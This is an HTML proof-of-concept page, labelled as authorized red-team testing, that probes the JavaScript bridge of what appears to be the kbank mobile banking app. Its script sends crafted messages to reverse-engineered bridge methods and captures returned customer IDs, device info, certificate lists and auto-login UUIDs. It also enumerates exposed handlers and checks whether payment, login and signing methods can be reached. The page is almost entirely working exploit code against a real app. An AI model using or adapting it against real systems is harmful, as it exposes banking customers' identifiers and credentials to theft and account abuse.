<!doctype html>
<html lang="ko">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>REDTEAM PoC — Bridge Reachability (자사 앱 테스트 전용)</title>
<style>
  body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:16px;background:#0b0b0d;color:#e6e6e6}
  h1{font-size:17px;color:#ff5c5c}
  .warn{background:#2a1a1a;border:1px solid #633;padding:10px;border-radius:8px;font-size:12px;margin:8px 0}
  .ok{color:#4ade80}.bad{color:#ff6b6b}.muted{color:#888}
  #log{white-space:pre-wrap;font:11px ui-monospace,Menlo,monospace;background:#141418;border-radius:8px;padding:12px;margin-top:12px}
</style>
</head>
<body>
<h1>⚠️ REDTEAM PoC — Bridge Reachability</h1>
<div class="warn">
  승인된 <b>테스트 전용</b>. 이 페이지는 <b>브릿지에 도달 가능한지와 데이터가 반환되는지</b>만 확인한다.
  <b>실제 결제·서명은 실행하지 않는다</b>(민감 함수는 존재 여부만 열거). 외부 배포·실사용자 대상 사용 금지.
</div>
<div id="log"></div>

<script>
const L=(s,c)=>{const d=document.getElementById('log');d.innerHTML+=(c?`<span class="${c}">${s}</span>`:s)+"\n";};
L("오리진: "+location.href,"muted");L("—".repeat(46));

// 역분석으로 확정된 kbank JS브리지 메서드 (74개 중 핵심)
const READ=["callKbankGetSetting","callGetSetting","callGetClipboardId","callPhoneInfo",
  "callExistAutoLoginUuid","callMpkiGetAllInfo","callCertList","callSimpleCertList",
  "callGetPushSettings","callGetSteps","callPageFinished"];
const ACTION=["callLogin","callNativeLogin","callNonLoginPay","callZeropayTranReq","callZeropayRsltReq",
  "callMpkiSign","callMPKISignWithAttr","callMpkiGetBioSignature","callCreateAutoLoginUuid",
  "callDeleteAutoLoginUuid","callOTACRegister","callScrapingBig","callSaveFile","callStartApp"];
// 디스패처 핸들러명 후보 (단일핸들러+method 디스패치형일 때)
const DISPATCHERS=["smartbank","kbank","Kbank","SmartBank","native","nativeBridge","KbankBridge",
  "JavaScriptService","kbankWebView","windowLoaded","iOS"];

// 반환값 포착: 네이티브가 어떤 콜백을 부르든 잡도록 window에 catch-all 설치
window.__rt=(tag,val)=>{const s=String(val).slice(0,160);
  const sens=/custid|cust_id|member|uuid|phone|ssn|account|cert/i.test(tag+val);
  L(`[응답] ${tag} = ${s}`+(sens?"  ⚠️ 민감값!":""),sens?"bad":"ok");};
// 흔한 콜백명들을 __rt로 연결(네이티브가 이 이름들로 돌려줄 수 있음)
["nativeCallback","bridgeCallback","onNativeResult","webkitCallback","kbankCallback",
 "callback","jsCallback","resultCallback"].forEach(n=>{try{window[n]=(...a)=>window.__rt(n,a.join(","));}catch(e){}});

const mh=(window.webkit&&window.webkit.messageHandlers)||{};
function send(h,payload){try{if(mh[h]){mh[h].postMessage(payload);return true;}}catch(e){}return false;}

// 1) 각 READ 메서드를 (a)개별 핸들러로 (b)디스패처+method 로 호출
L("[READ] 값 반환 시도:","muted");
READ.forEach(m=>{
  let hit=false;
  // (a) 메서드명 자체가 핸들러명인 경우
  hit|=send(m,{param:"custid",callback:"nativeCallback",callbackId:"__rt"});
  hit|=send(m,"custid");
  // (b) 디스패처 핸들러에 method 필드로
  DISPATCHERS.forEach(d=>{hit|=send(d,JSON.stringify({method:m,data:{key:"custid"},callback:"nativeCallback"}));});
  L(`  ${m}: ${hit?"전송됨 → [응답] 확인":"핸들러 없음"}`,hit?"ok":"muted");
});

// 2) 노출된 핸들러 열거
L("—".repeat(46));
let names=[];try{names=Object.keys(mh);}catch(e){}
[...READ,...ACTION,...DISPATCHERS].forEach(n=>{if(mh[n])names.push(n);});
names=[...new Set(names)];
L("노출된 브릿지 핸들러: "+(names.length?names.join(", "):"(열거 불가)"),names.length?"bad":"muted");

// 3) ACTION 메서드 — 도달 가능 여부만 (실행 안 함)
L("—".repeat(46));L("[ACTION] 도달 가능성 (※ 실행 안 함):","muted");
ACTION.forEach(m=>{const r=names.length>0||mh[m];L(`  ${m}: ${r?"도달 가능성 ⚠️":"미확인"}`,r?"bad":"muted");});

L("—".repeat(46));
L("판정: [응답]에 custid/uuid 뜨면 = 오리진검증 없음(#1 취약). 서버로그 히트 = 스킴 하이재킹 성립.","muted");
</script>
</body>
</html>
